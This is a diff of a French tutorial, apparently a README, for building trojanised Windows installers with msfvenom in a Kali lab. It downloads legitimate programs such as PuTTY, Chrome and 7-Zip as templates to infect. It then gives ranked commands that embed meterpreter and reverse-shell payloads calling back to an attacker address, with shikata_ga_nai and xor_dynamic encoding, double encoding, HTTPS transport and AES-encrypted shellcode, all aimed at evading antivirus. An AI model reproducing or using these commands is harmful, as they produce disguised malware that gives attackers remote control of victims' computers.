@@ -238,32 +238,180 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ## dans virtual box :
 
-### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telecharger les fichier exe comme chrome ou firefox, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
-
-## la commande pour telecharger chrome exe :
-
-````bash
-wget -4 -O ChromeSetup.exe "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
-ls
-````
-
-## ou firefox :
-
-````bash
-wget -4 -O FirefoxInstaller.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=fr"
-````
-
-## puis la commande pour faire le malwar dans le chrome telecharger :
-
-````bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/ChromeSetup.exe -o /home/kali/Desktop/chrome_setup.exe
-````
-
-## ou firefox :
-
-````bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/FirefoxSetup.exe -o /home/kali/Desktop/firefox_setup.exe
-````
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=9000 -f exe -e x86/shikata_ga_nai -i 5 -k -x  /root/ChromeSetup.exe -o /home/kali/Desktop/chrome_setup.exe
+### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telechargerdes ressource a infecter, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
 
 <img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
+
+### Templates Windows (à infecter)
+
+```bash
+# 1. Putty 64-bit (LE PLUS LÉGER - RECOMMANDÉ)
+wget -4 -O /root/putty.exe "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+
+# 2. Putty 32-bit (pour Shellter)
+wget -4 -O /root/putty32.exe "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
+
+# 3. Notepad++ (léger)
+wget -4 -O /root/npp.exe "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.4/npp.8.5.4.Installer.exe"
+
+# 4. 7-Zip (léger)
+wget -4 -O /root/7z.exe "https://www.7-zip.org/a/7z2201.exe"
+
+# 5. Chrome (lourd ~20MB)
+wget -4 -O /root/ChromeSetup.exe "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
+
+# 6. Firefox (lourd ~30MB)
+wget -4 -O /root/FirefoxInstaller.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=fr"
+
+# 7. VLC (moyen)
+wget -4 -O /root/vlc.exe "https://get.videolan.org/vlc/3.0.18/win64/vlc-3.0.18-win64.exe"
+
+# 8. SumatraPDF (léger)
+wget -4 -O /root/sumatra.exe "https://www.sumatrapdfreader.org/dl/SumatraPDF-3.4.6-64-install.exe"
+```
+
+---
+
+##  COMMANDES MSFVENOM (Du moins puissant au plus puissant)
+
+---
+
+###  PAYLOAD BRUT (Sans encodage - Très détectable)
+
+```bash
+# Payload Windows 64-bit brut
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/payload.exe
+```
+
+```bash
+# Payload Windows 32-bit brut
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/payload_x86.exe
+```
+
+```bash
+# Payload Shell reverse brut
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/shell.exe
+```
+
+---
+
+###  AVEC ENCODAGE SHIKATA_GA_NAI (Moyennement détectable)
+
+```bash
+# Shikata_ga_nai 1 itération
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 1 -f exe -o /home/kali/Desktop/payload_shikata1.exe
+```
+
+```bash
+# Shikata_ga_nai 5 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/payload_shikata5.exe
+```
+
+```bash
+# Shikata_ga_nai 10 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/payload_shikata10.exe
+```
+
+```bash
+# Shikata_ga_nai 20 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o /home/kali/Desktop/payload_shikata20.exe
+```
+
+---
+
+### : AVEC XOR_DYNAMIC (Moins détectable que shikata)
+
+```bash
+# XOR_Dynamic 1 itération
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 1 -f exe -o /home/kali/Desktop/payload_xor1.exe
+```
+
+```bash
+# XOR_Dynamic 10 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/payload_xor10.exe
+```
+
+```bash
+# XOR_Dynamic 20 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/payload_xor20.exe
+```
+
+```bash
+# XOR_Dynamic 30 itérations (très long à générer)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 30 -f exe -o /home/kali/Desktop/payload_xor30.exe
+```
+
+---
+
+###  AVEC TEMPLATE (Fichier légitime) - MOINS DÉTECTABLE
+
+```bash
+# Putty + pas d'encodage
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_payload.exe
+```
+
+```bash
+# Putty + Shikata 5 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/putty_shikata5.exe
+```
+
+```bash
+# Putty + XOR_Dynamic 10 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_xor10.exe
+```
+
+---
+
+###  TEMPLATE + HTTPS (Trafic chiffré) - TRÈS FURTIF
+
+```bash
+# Putty + HTTPS (trafic chiffré)
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_https.exe
+```
+
+```bash
+# Putty + HTTPS + 20 itérations (ULTIME)
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/putty_ultimate.exe
+```
+
+---
+
+###  DOUBLE ENCODAGE (Très difficile à détecter)
+
+```bash
+# Double encodage : XOR_Dynamic + Shikata
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/double_encoded.exe
+```
+
+```bash
+# Double encodage + Template Putty
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_encoded_putty.exe
+```
+
+---
+
+###  AES CHIFFRÉ (Niveau Expert)
+
+```bash
+# Étape 1 : Générer le shellcode
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw -o /home/kali/Desktop/shellcode.bin
+```
+
+```bash
+# Étape 2 : Chiffrer avec AES
+python3 -c "
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
+
+key = os.urandom(32)
+iv = os.urandom(16)
+with open('/home/kali/Desktop/shellcode.bin', 'rb') as f:
+    data = f.read()
+cipher = AES.new(key, AES.MODE_CBC, iv)
+encrypted = cipher.encrypt(pad(data, AES.block_size))
+with open('/home/kali/Desktop/encrypted.bin', 'wb') as f:
+    f.write(iv + encrypted)
+print('Clé AES (hex):', key.hex())
+"
+
